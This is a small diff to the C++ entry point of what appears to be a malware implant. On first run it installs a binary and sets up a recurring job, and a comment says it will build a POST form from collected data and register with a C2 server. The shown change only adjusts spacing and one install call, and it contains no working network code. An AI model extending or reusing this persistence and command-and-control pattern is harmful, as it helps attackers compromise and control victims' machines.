@@ -18,11 +18,11 @@ int main() {
     fs::path install_dir = util::GetInstallDir();
     AuthFile auth(install_dir / AUTH_FILE);
 
-    if(!auth.Exists()) {
+    if (!auth.Exists()) {
         auth.Init();
 
         Installer install(install_dir);
-        install.InstallFiles();
+        install.InstallFile(BIN, BIN_NEW);
         install.InitRecurringJob();
 
         // Create POST form from DataList and register C2 server
